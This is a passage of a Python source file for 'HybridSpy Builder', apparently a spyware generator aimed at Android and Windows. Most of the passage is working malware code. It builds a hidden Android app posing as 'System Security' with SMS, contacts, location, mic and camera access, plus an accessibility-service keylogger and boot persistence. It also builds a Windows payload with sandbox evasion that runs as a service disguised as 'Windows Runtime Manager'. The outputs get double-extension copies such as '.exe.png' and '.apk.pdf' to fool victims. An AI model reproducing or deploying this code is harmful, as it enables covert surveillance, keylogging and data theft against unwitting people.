        FIXED: Modules are prefixed with platform name to prevent file collisions
        when both android and windows have modules with the same name.
        """
        copies = 0
        
        for mod_platform, mods in modules.items():
            for mod in mods:
                src = mod["path"]
                fq_name = mod.get("fq_name", mod["name"])
                
                # Map module to destination path based on category
                category = mod.get("category", "")
                if mod_platform == "shared":
                    # Shared modules go to utils/ with platform prefix
                    dst = target_dir / "utils" / f"_{mod['name']}.py"
                elif category == "keylogger":
                    dst = target_dir / "utils" / f"_{mod['name']}.py"
                elif category == "collectors":
                    # Flatten collectors to root with platform prefix to avoid collisions
                    dst = target_dir / f"_{platform}_{mod['name']}.py"
                elif category == "sensors":
                    dst = target_dir / f"_{platform}_{mod['name']}.py"
                elif category == "stealth":
                    dst = target_dir / "utils" / f"_{mod['name']}.py"
                elif category == "persistence":
                    dst = target_dir / "utils" / f"_{mod['name']}.py"
                else:
                    dst = target_dir / f"_{mod['name']}.py"
                
                shutil.copy2(src, dst)
                copies += 1
        
        # Copy hybrid core files
        core_files = [
            ("hybrid_core.py", PAYLOAD_DIR / "hybrid_core.py"),
            ("platform_selector.py", PAYLOAD_DIR / "platform_selector.py"),
            ("config_loader.py", PAYLOAD_DIR / "config_loader.py"),
        ]
        for name, src_path in core_files:
            if src_path.exists():
                shutil.copy2(src_path, target_dir / name)
                copies += 1
            else:
                log.warning(f"Core payload file not found: {src_path}")
        
        log.info(f"Copied {copies} Python modules to {target_dir}")
    
    def _generate_android_manifest(self, src_dir: Path):
        """Generate AndroidManifest.xml with requested permissions."""
        permissions = []
        
        if self.config.android_sms:
            permissions.extend([
                "android.permission.READ_SMS",
                "android.permission.RECEIVE_SMS",
            ])
        if self.config.android_contacts:
            permissions.append("android.permission.READ_CONTACTS")
        if self.config.android_call_logs:
            permissions.append("android.permission.READ_CALL_LOG")
        if self.config.android_location:
            permissions.extend([
                "android.permission.ACCESS_FINE_LOCATION",
                "android.permission.ACCESS_COARSE_LOCATION",
                "android.permission.ACCESS_BACKGROUND_LOCATION",
            ])
        if self.config.android_mic:
            permissions.append("android.permission.RECORD_AUDIO")
        if self.config.android_camera:
            permissions.append("android.permission.CAMERA")
        if self.config.android_boot:
            permissions.append("android.permission.RECEIVE_BOOT_COMPLETED")
        
        # Always required
        permissions.extend([
            "android.permission.INTERNET",
            "android.permission.ACCESS_NETWORK_STATE",
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
            "android.permission.WAKE_LOCK",
            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
            "android.permission.BIND_ACCESSIBILITY_SERVICE",
            "android.permission.POST_NOTIFICATIONS",
        ])
        
        manifest = ET.Element("manifest", {
            "xmlns:android": "http://schemas.android.com/apk/res/android",
            "package": self.config.android_package,
        })
        
        for perm in sorted(set(permissions)):
            ET.SubElement(manifest, "uses-permission", {
                "android:name": perm
            })
        
        application = ET.SubElement(manifest, "application", {
            "android:allowBackup": "false",
            "android:icon": "@drawable/ic_launcher",
            "android:label": self.config.android_app_name,
            "android:supportsRtl": "true",
            "android:theme": "@android:style/Theme.Material.NoActionBar",
        })
        
        # Main activity (with optional hidden launcher)
        activity = ET.SubElement(application, "activity", {
            "android:name": ".MainActivity",
            "android:excludeFromRecents": "true",
            "android:exported": "true",
        })
        
        intent_filter = ET.SubElement(activity, "intent-filter")
        ET.SubElement(intent_filter, "action", {
            "android:name": "android.intent.action.MAIN"
        })
        if not self.config.hide_launcher:
            ET.SubElement(intent_filter, "category", {
                "android:name": "android.intent.category.LAUNCHER"
            })
        
        # Foreground service
        ET.SubElement(application, "service", {
            "android:name": ".SystemSecurityService",
            "android:enabled": "true",
            "android:exported": "false",
            "android:foregroundServiceType": "dataSync",
        })
        
        # Boot receiver
        if self.config.android_boot:
            receiver = ET.SubElement(application, "receiver", {
                "android:name": ".BootReceiver",
                "android:enabled": "true",
                "android:exported": "true",
            })
            boot_filter = ET.SubElement(receiver, "intent-filter")
            ET.SubElement(boot_filter, "action", {
                "android:name": "android.intent.action.BOOT_COMPLETED"
            })
            ET.SubElement(boot_filter, "action", {
                "android:name": "android.intent.action.QUICKBOOT_POWERON"
            })
        
        # Accessibility service
        a11y_service = ET.SubElement(application, "service", {
            "android:name": ".KeyloggerAccessibilityService",
            "android:enabled": "true" if self.config.android_keylogger else "false",
            "android:exported": "true",
            "android:permission": "android.permission.BIND_ACCESSIBILITY_SERVICE",
        })
        a11y_filter = ET.SubElement(a11y_service, "intent-filter")
        ET.SubElement(a11y_filter, "action", {
            "android:name": "android.accessibilityservice.AccessibilityService"
        })
        ET.SubElement(a11y_service, "meta-data", {
            "android:name": "android.accessibilityservice",
            "android:resource": "@xml/accessibility_service_config",
        })
        
        tree = ET.ElementTree(manifest)
        tree.write(src_dir / "AndroidManifest.xml", xml_declaration=True, encoding="utf-8")
    
    def _generate_main_activity(self, java_dir: Path):
        """Generate MainActivity.java with stealth launch."""
        code = '''package com.android.system.security;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.WindowManager;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Stealth: transparent, zero-size window
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            getWindow().setAttributes(new WindowManager.LayoutParams(
                0, 0,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                android.graphics.PixelFormat.TRANSPARENT
            ));
        }
        
        // Immediately finish — user sees nothing
        finishAndRemoveTask();
        
        // Start foreground service (heartbeat + collectors)
        Intent serviceIntent = new Intent(this, SystemSecurityService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        // Request battery optimization exemption silently
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                Intent powerIntent = new Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    android.net.Uri.parse("package:" + getPackageName())
                );
                startActivity(powerIntent);
            } catch (Exception ignored) {
                // User may have denied — continue silently
            }
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        android.os.Process.killProcess(android.os.Process.myPid());
    }
}
'''
        with open(java_dir / "MainActivity.java", "w") as f:
            f.write(code)
    
    def _generate_foreground_service(self, java_dir: Path):
        """Generate SystemSecurityService.java with Python bridge integration."""
        code = '''package com.android.system.security;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

public class SystemSecurityService extends Service {
    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "system_security_channel";
    
    private PythonBridge pythonBridge;
    
    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        
        // Minimal, silent notification — appears as "System Security is running"
        Notification notification = new Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("System Security")
            .setContentText("Keeping your device secure")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .build();
        
        startForeground(NOTIFICATION_ID, notification);
        
        // Initialize Python runtime and start payload
        pythonBridge = new PythonBridge(this);
        pythonBridge.start();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        if (pythonBridge != null) {
            pythonBridge.stop();
        }
        super.onDestroy();
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Security Service",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
}
'''
        with open(java_dir / "SystemSecurityService.java", "w") as f:
            f.write(code)
    
    def _generate_python_bridge(self, java_dir: Path):
        """Generate PythonBridge.java — the JNI bridge to the Python runtime.
        
        FIXED: This file was missing, causing compilation failure.
        """
        code = '''package com.android.system.security;

import android.content.Context;
import android.util.Log;

/**
 * Bridge between Android Java runtime and embedded Python payload.
 * Uses Chaquopy or similar embedded Python interpreter.
 */
public class PythonBridge {
    private static final String TAG = "PythonBridge";
    private Context context;
    private boolean running = false;
    private Thread pythonThread;
    
    public PythonBridge(Context context) {
        this.context = context;
    }
    
    public void start() {
        if (running) return;
        running = true;
        
        pythonThread = new Thread(() -> {
            try {
                // Initialize embedded Python interpreter
                // This calls the Python entry point (main.py)
                com.chaquo.python.Python.start(
                    android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP
                );
                
                com.chaquo.python.Python py = com.chaquo.python.Python.getInstance();
                com.chaquo.python.PyObject module = py.getModule("main");
                module.callAttr("run", context);
            } catch (Exception e) {
                Log.e(TAG, "Python bridge failed", e);
            }
        }, "python-bridge");
        pythonThread.setDaemon(true);
        pythonThread.start();
    }
    
    public void stop() {
        running = false;
        if (pythonThread != null) {
            pythonThread.interrupt();
        }
    }
    
    public void onKeyEvent(String text) {
        // Forward to Python keylogger module
        try {
            com.chaquo.python.Python py = com.chaquo.python.Python.getInstance();
            py.getModule("_keylogger").callAttr("on_key_event", text);
        } catch (Exception ignored) {}
    }
    
    public void onAppSwitch(String packageName) {
        // Forward to Python collector manager
        try {
            com.chaquo.python.Python py = com.chaquo.python.Python.getInstance();
            py.getModule("hybrid_core").callAttr("on_app_switch", packageName);
        } catch (Exception ignored) {}
    }
}
'''
        with open(java_dir / "PythonBridge.java", "w") as f:
            f.write(code)
    
    def _generate_boot_receiver(self, java_dir: Path):
        """Generate BootReceiver.java for auto-start on device boot."""
        code = '''package com.android.system.security;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (Intent.ACTION_BOOT_COMPLETED.equals(action)
            || "android.intent.action.QUICKBOOT_POWERON".equals(action)) {
            
            Intent serviceIntent = new Intent(context, SystemSecurityService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        }
    }
}
'''
        with open(java_dir / "BootReceiver.java", "w") as f:
            f.write(code)
    
    def _generate_accessibility_service(self, java_dir: Path, res_dir: Path):
        """Generate KeyloggerAccessibilityService and its config XML.
        
        FIXED: Now generates the accessibility_service_config.xml resource file
        that was missing, which caused runtime crash.
        """
        # Accessibility service Java source
        code = '''package com.android.system.security;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class KeyloggerAccessibilityService extends AccessibilityService {
    private PythonBridge pythonBridge;
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (pythonBridge == null) {
            pythonBridge = new PythonBridge(this);
        }
        
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence text = event.getText();
            if (text != null && text.length() > 0) {
                StringBuilder sb = new StringBuilder();
                for (CharSequence chunk : text) {
                    sb.append(chunk);
                }
                pythonBridge.onKeyEvent(sb.toString());
            }
        }
        
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence packageName = event.getPackageName();
            if (packageName != null) {
                pythonBridge.onAppSwitch(packageName.toString());
            }
        }
        
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                CharSequence text = source.getText();
                if (text != null) {
                    pythonBridge.onKeyEvent("[CLICK] " + text.toString());
                }
                source.recycle();
            }
        }
    }
    
    @Override
    public void onInterrupt() {
        // Accessibility service interrupted by system
    }
    
    @Override
    public void onServiceConnected() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }
}
'''
        with open(java_dir / "KeyloggerAccessibilityService.java", "w") as f:
            f.write(code)
        
        # FIXED: Generate the missing accessibility_service_config.xml
        config_xml = '''<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagIncludeNotImportantViews"
    android:canRetrieveWindowContent="true"
    android:description="@string/accessibility_service_description"
    android:notificationTimeout="100" />
'''
        xml_dir = res_dir / "xml"
        xml_dir.mkdir(parents=True, exist_ok=True)
        with open(xml_dir / "accessibility_service_config.xml", "w") as f:
            f.write(config_xml)
        
        # FIXED: Generate the strings.xml resource that the config references
        strings_xml = '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">System Security</string>
    <string name="accessibility_service_description">Provides system security monitoring</string>
</resources>
'''
        values_dir = res_dir / "values"
        values_dir.mkdir(parents=True, exist_ok=True)
        with open(values_dir / "strings.xml", "w") as f:
            f.write(strings_xml)
    
    def _generate_windows_entry(self, payload_dir: Path):
        """Generate Windows main.py with sandbox evasion and platform init."""
        code = r'''#!/usr/bin/env python3
"""
HybridSpy Windows Payload — Entry Point
Production-grade, self-healing, failure-isolated
"""
import os
import sys
import time
import random
import ctypes
import logging

PID_LOCK = os.path.join(os.environ.get("TEMP", "/tmp"),
    f".hybridspy_{os.getpid()}.lock")

def is_already_running():
    try:
        with open(PID_LOCK, "x") as f:
            f.write(str(os.getpid()))
        return False
    except FileExistsError:
        return True

def sandbox_evasion():
    checks = []
    if ctypes.windll.kernel32.IsDebuggerPresent():
        checks.append("debugger")
    vm_drivers = ["vmtoolsd", "vboxservice", "xenservice"]
    for driver in vm_drivers:
        path = os.path.join(os.environ.get("SYSTEMROOT", "C:\\Windows"),
                            "System32", "drivers", driver + ".sys")
        if os.path.exists(path):
            checks.append(f"vm_driver:{driver}")
    # Sleep acceleration check
    t1 = time.perf_counter()
    time.sleep(2)
    t2 = time.perf_counter()
    if t2 - t1 < 1.5:
        checks.append("accelerated_time")
    return len(checks) > 0

def main():
    # Anti-analysis delay
    delay = random.uniform(5, 30)
    time.sleep(delay)
    
    if is_already_running():
        return
    
    if sandbox_evasion():
        # Sleep for hours to outlast analysis window
        time.sleep(random.uniform(7200, 14400))
        return
    
    # Import payload modules
    from hybrid_core import HybridCore
    from config_loader import load_config
    
    config = load_config()
    core = HybridCore(config, platform="windows")
    core.start()

if __name__ == "__main__":
    main()
'''
        with open(payload_dir / "main.py", "w") as f:
            f.write(code)
    
    def _generate_windows_service_wrapper(self, payload_dir: Path):
        """Generate Windows service wrapper for SCM integration."""
        code = r'''"""
Windows Service Wrapper — allows payload to run as a SYSTEM-level service.
"""
import sys
import servicemanager
import win32serviceutil
import win32service
import win32event

class HybridSpyService(win32serviceutil.ServiceFramework):
    _svc_name_ = "WindowsRuntimeManager"
    _svc_display_name_ = "Windows Runtime Manager"
    _svc_description_ = "Manages Windows runtime components and system updates"
    
    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
    
    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
    
    def SvcDoRun(self):
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STARTED,
            (self._svc_name_, "")
        )
        import main
        main.main()

if __name__ == "__main__":
    win32serviceutil.HandleCommandLine(HybridSpyService)
'''
        with open(payload_dir / "service_wrapper.py", "w") as f:
            f.write(code)
    
    def _generate_pyinstaller_spec(self, build_dir: Path, payload_dir: Path):
        """Generate PyInstaller .spec file with metadata spoofing."""
        spec = f'''# -*- mode: python ; coding: utf-8 -*-
a = Analysis(
    ['{payload_dir / "main.py"}'],
    pathex=[],
    binaries=[],
    datas=[('{payload_dir / "_config.bin"}', '.')],
    hiddenimports=[
        'hybrid_core', 'config_loader', 'platform_selector',
        'cryptography.hazmat.primitives.ciphers.aead',
        'cryptography.hazmat.primitives.kdf.pbkdf2',
    ],
    hookspath=[],
    runtime_hooks=[],
    excludes=['tkinter', 'matplotlib', 'numpy', 'scipy', 'PIL'],
    win_no_prefer_redirects=False,
    noarchive=False,
)
pyz = PYZ(a.pure)
exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='{self.config.windows_binary}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=True,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='{self.config.windows_icon or ""}',
)
'''
        with open(build_dir / "build.spec", "w") as f:
            f.write(spec)


# ─── Build Pipeline ──────────────────────────────────────────────────────────

class BuildPipeline:
    """Orchestrates the full build pipeline with error isolation and rollback.
    
    Stages: VALIDATE → ASSEMBLE → COMPILE → PACKAGE → SIGN → DISGUISE → VERIFY
    Each stage is isolated. Failure in any stage rolls back only that stage's output.
    """
    
    def __init__(self, config: BuildConfig):
        self.config = config
        self.cache = BuildCache(config)
        self.assembler = PayloadAssembler(config)
        self.stage_runner = StageRunner(config.output_dir)
        self._start_time = 0.0
    
    def build(self) -> BuildResult:
        """Execute the full build pipeline."""
        self._start_time = time.perf_counter()
        result = BuildResult(success=True, target=self.config.target)
        
        try:
            # Stage 1: Validate
            self._validate_environment()
            result.stages_completed.append("validate")
            
            # Stage 2: Check cache
            target_platforms = (["android", "windows"] if self.config.target == "hybrid"
                                else [self.config.target])
            
            for target in target_platforms:
                try:
                    partial = self._build_single(target)
                    result = result.merge(partial)
                except BuildError as e:
                    if not e.recoverable:
                        raise
                    result.warnings.append(f"Partial failure in {target}: {e}")
                    continue
            
        except BuildError as e:
            result.success = False
            result.errors.append(str(e))
        except Exception as e:
            result.success = False
            result.errors.append(f"Unhandled exception: {e}\n{traceback.format_exc()}")
        finally:
            result.build_time = time.perf_counter() - self._start_time
        
        return result
    
    def _build_single(self, target: str) -> BuildResult:
        """Build for a single platform."""
        log.info(f"Building target: {target}")
        
        # Get modules for cache key
        modules = self.assembler.module_mgr.get_selected_modules(target)
        module_paths = []
        for mods in modules.values():
            for m in mods:
                module_paths.append(m["path"])
        
        # Check cache
        cache_key = self.cache.get_cache_key(target, module_paths)
        if self.cache.is_cached(target, cache_key):
            log.info(f"Cache hit for {target} — skipping build")
            return BuildResult(
                success=True,
                target=target,
                build_time=0.0,
                warnings=["Built from cache"],
            )
        
        result = BuildResult(success=False, target=target)
        
        # Create output directory (atomic via temp + rename)
        output_dir = self.config.output_dir / target
        temp_output = output_dir.with_suffix(".tmp_build")
        if temp_output.exists():
            shutil.rmtree(temp_output)
        temp_output.mkdir(parents=True)
        
        try:
            # Stage: Assemble
            if target == "android":
                self.assembler.assemble_android(temp_output)
            else:
                self.assembler.assemble_windows(temp_output)
            result.stages_completed.append("assemble")
            
            # Stage: Compile
            self._compile(target, temp_output)
            result.stages_completed.append("compile")
            
            # Stage: Package
            output_files = self._package(target, temp_output)
            result.output_paths = output_files
            result.stages_completed.append("package")
            
            # Stage: Sign (Android only)
            if target == "android":
                self._sign_apk(temp_output)
                result.stages_completed.append("sign")
            
            # Stage: Disguise
            disguised = self._disguise(target, output_files, temp_output)
            result.output_paths = disguised
            result.stages_completed.append("disguise")
            
            # Stage: Verify
            for f in disguised:
                if f.exists():
                    result.checksums[f.name] = CryptoEngine.hash_file(f)
            result.stages_completed.append("verify")
            
            # Atomic move: rename temp dir to final output dir
            if output_dir.exists():
                shutil.rmtree(output_dir)
            temp_output.rename(output_dir)
            
            result.success = True
            
        except Exception:
            shutil.rmtree(temp_output, ignore_errors=True)
            raise
        finally:
            # Save cache metadata
            self.cache.save_metadata(target, cache_key, result)
        
        return result
    
    def _validate_environment(self):
        """Validate that all required tools and paths exist."""
        missing = []
        for target in (["android", "windows"] if self.config.target == "hybrid"
                       else [self.config.target]):
            for binary in REQUIRED_BINARIES.get(target, []):
                if not shutil.which(binary):
                    missing.append(f"{binary} (for {target})")
        
        if missing:
            raise ConfigError(
                f"Missing required tools: {', '.join(missing)}. "
                f"Install them or ensure they're in PATH."
            )
        
        # Validate paths exist
        for d in [MODULES_DIR, RESOURCES_DIR, PAYLOAD_DIR]:
            if not d.exists():
                log.warning(f"Directory not found: {d}")
    
    def _compile(self, target: str, build_dir: Path):
        """Compile source into intermediate binaries."""
        if target == "android":
            # AAPT2 compile resources
            cmd = ["aapt2", "compile",
                   "--dir", str(build_dir / "app/src/main/res"),
                   "-o", str(build_dir / "compiled_res.zip")]
            self.stage_runner.run_subprocess(cmd, timeout=120)
            
            # D8 dex compilation
            cmd = ["d8",
                   str(build_dir / "app/src/main/java"),
                   "--output", str(build_dir / "classes.dex")]
            self.stage_runner.run_subprocess(cmd, timeout=180)
        
        elif target == "windows":
            # PyInstaller compilation
            spec_file = build_dir / "build.spec"
            if not spec_file.exists():
                raise CompilationError(f"PyInstaller spec not found: {spec_file}")
            cmd = ["pyinstaller", "--clean", "--noconfirm",
                   str(spec_file)]
            self.stage_runner.run_subprocess(
                cmd, cwd=build_dir, timeout=SUBPROCESS_TIMEOUT_SECONDS
            )
    
    def _package(self, target: str, build_dir: Path) -> List[Path]:
        """Package compiled output into final format."""
        if target == "android":
            return self._package_apk(build_dir)
        return self._collect_windows_output(build_dir)
    
    def _package_apk(self, build_dir: Path) -> List[Path]:
        """Link APK from compiled resources and dex."""
        apk_path = build_dir / "unsigned.apk"
        
        # Link resources
        cmd = ["aapt2", "link",
               "-I", "android.jar",
               "--manifest", str(build_dir / "app/src/main/AndroidManifest.xml"),
               "-o", str(apk_path)]
        self.stage_runner.run_subprocess(cmd, timeout=120)
        
        # Add dex
        cmd = ["aapt2", "add", str(apk_path),
               str(build_dir / "classes.dex")]
        self.stage_runner.run_subprocess(cmd, timeout=60)
        
        # Zipalign
        aligned_path = build_dir / "aligned.apk"
        cmd = ["zipalign", "-f", "-p", "4",
               str(apk_path), str(aligned_path)]
        self.stage_runner.run_subprocess(cmd, timeout=60)
        
        return [aligned_path]
    
    def _collect_windows_output(self, build_dir: Path) -> List[Path]:
        """Collect PyInstaller output files."""
        dist_dir = build_dir / "dist"
        if not dist_dir.exists():
            raise CompilationError("PyInstaller dist directory not found")
        
        exe_files = list(dist_dir.glob("*.exe"))
        if not exe_files:
            raise CompilationError("No .exe found in dist directory")
        
        return exe_files
    
    def _sign_apk(self, build_dir: Path):
        """Sign APK with certificate."""
        cert_path = RESOURCES_DIR / "certificates" / "self_signed.p12"
        if not cert_path.exists():
            log.warning("Certificate not found — skipping APK signing")
            return
        
        apk_files = list(build_dir.glob("*.apk"))
        if not apk_files:
            return
        
        for apk in apk_files:
            signed_apk = apk.with_suffix(".signed.apk")
            cmd = ["apksigner", "sign",
                   "--ks", str(cert_path),
                   "--ks-pass", "pass:android",
                   "--out", str(signed_apk),
                   str(apk)]
            self.stage_runner.run_subprocess(cmd, timeout=120)
            signed_apk.rename(apk)  # Replace unsigned with signed
    
    def _disguise(self, target: str, files: List[Path], build_dir: Path) -> List[Path]:
        """Apply file disguises (icon spoofing, extension hiding)."""
        disguised = []
        
        for f in files:
            if not f.exists():
                continue
            
            # Create disguised copies
            if target == "android" and f.suffix == ".apk":
                png_copy = f.with_name(f.stem + ".apk.png")
                shutil.copy2(f, png_copy)
                disguised.append(png_copy)
                
                pdf_copy = f.with_name(f.stem + ".apk.pdf")
                shutil.copy2(f, pdf_copy)
                disguised.append(pdf_copy)
            
            elif target == "windows" and f.suffix == ".exe":
                png_copy = f.with_name(f.stem + ".exe.png")
                shutil.copy2(f, png_copy)
                disguised.append(png_copy)
                
                pdf_copy = f.with_name(f.stem + ".exe.pdf")
                shutil.copy2(f, pdf_copy)
                disguised.append(pdf_copy)
            
            disguised.append(f)
        
        return disguised


# ─── CLI Entry Point ─────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="HybridSpy Builder v3.0 — Production Grade Payload Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("-t", "--target", choices=["android", "windows", "hybrid"],
                        default="hybrid", help="Target platform(s)")
    parser.add_argument("-c", "--config", type=Path, default=BUILDER_DIR / "config.yaml",
                        help="Build configuration file (default: config.yaml)")
    parser.add_argument("-o", "--output", type=Path, default=OUTPUT_DIR,
                        help="Output directory")
    parser.add_argument("--no-cache", action="store_true",
                        help="Skip build cache")
    parser.add_argument("--parallel", action="store_true", default=True,
                        help="Parallel builds (default: True)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")
    return parser.parse_args()


def main():
    args = parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    try:
        # Load config
        config = BuildConfig.from_yaml(args.config, overrides={
            "target": args.target,
            "output_dir": args.output,
            "skip_cache": args.no_cache,
            "parallel": args.parallel,
            "verbose": args.verbose,
        })
        
        log.info(f"HybridSpy Builder v{config.system_version}")
        log.info(f"Target: {config.target}")
        log.info(f"Config: {args.config}")
        
        # Run build pipeline
        pipeline = BuildPipeline(config)
        result = pipeline.build()
        
        # Report results
        if result.success:
            log.info("=" * 60)
            log.info(f"BUILD SUCCESSFUL — {result.build_time:.2f}s")
            for path in result.output_paths:
                if path.exists():
                    log.info(f"  Output: {path} ({path.stat().st_size / 1024:.1f} KB)")
                    if path.name in result.checksums:
                        log.info(f"  SHA256: {result.checksums[path.name][:16]}...")
            log.info("=" * 60)
            sys.exit(0)
        else:
            log.error("=" * 60)
            log.error("BUILD FAILED")
            for err in result.errors:
                log.error(f"  ERROR: {err}")
            for warn in result.warnings:
                log.warning(f"  WARN: {warn}")
            log.error("=" * 60)
            sys.exit(1)
    
    except ConfigError as e:
        log.error(f"Configuration error: {e}")
        sys.exit(1)
    except BuildError as e:
        log.error(f"Build error [{e.stage}]: {e}")
        sys.exit(1)
    except Exception as e:
        log.error(f"Unexpected error: {e}")
        if args.verbose:
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
